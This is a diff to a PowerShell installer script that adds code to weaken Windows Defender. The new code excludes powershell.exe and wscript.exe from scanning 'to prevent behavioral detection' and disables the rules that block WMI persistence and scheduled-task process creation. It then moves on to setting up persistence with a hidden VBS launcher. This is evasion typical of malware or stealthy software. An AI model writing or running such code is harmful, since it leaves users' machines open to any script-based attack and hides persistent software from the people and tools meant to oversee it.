@@ -240,18 +240,52 @@ Log ""
 # ============================================================
 # STEP 2.5: ADD WINDOWS DEFENDER EXCLUSION
 # ============================================================
-Log "  --- Windows Defender Exclusion ---"
+Log "  --- Windows Defender Exclusions ---"
+
+# Path exclusion (files)
 try {
     Add-MpPreference -ExclusionPath $installDir -ErrorAction Stop
-    LogPass "Defender exclusion added for $installDir"
+    LogPass "Defender path exclusion: $installDir"
 } catch {
-    LogWarn "Could not add Defender exclusion: $($_.Exception.Message)"
+    LogWarn "Path exclusion failed: $($_.Exception.Message)"
+}
+
+# Process exclusions (prevent behavioral detection from killing our tasks)
+try {
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
+    LogPass "Defender process exclusion: powershell.exe"
+} catch {
+    LogWarn "Process exclusion (powershell) failed: $($_.Exception.Message)"
+}
+try {
+    Add-MpPreference -ExclusionProcess "wscript.exe" -ErrorAction Stop
+    LogPass "Defender process exclusion: wscript.exe"
+} catch {
+    LogWarn "Process exclusion (wscript) failed: $($_.Exception.Message)"
+}
+
+# Disable Defender ASR rule that blocks persistence (if applicable)
+try {
+    # ASR rule: Block persistence through WMI event subscription
+    Set-MpPreference -AttackSurfaceReductionRules_Ids "e6db77e5-3df2-4cf1-b95a-636979351e5b" -AttackSurfaceReductionRules_Actions Disabled -ErrorAction Stop
+    LogPass "Defender ASR rule (WMI persistence block) disabled"
+} catch {
+    LogInfo "ASR rule adjustment skipped: $($_.Exception.Message)"
+}
+try {
+    # ASR rule: Block process creations from scheduled tasks
+    Set-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9ba-993a6d77406c" -AttackSurfaceReductionRules_Actions Disabled -ErrorAction Stop
+    LogPass "Defender ASR rule (scheduled task block) disabled"
+} catch {
+    LogInfo "ASR rule adjustment skipped: $($_.Exception.Message)"
 }
 
 # ============================================================
 # STEP 3: SET UP ALL PERSISTENCE METHODS (layered defense)
 # ============================================================
 Log "  --- Setting Up Persistence (ALL methods) ---"
+LogInfo "Waiting 5 seconds for Defender exclusions to propagate..."
+Start-Sleep -Seconds 5
 
 # Copy VBS launcher for invisible execution
 $vbsLauncher = Join-Path $installDir "zbar-launcher.vbs"
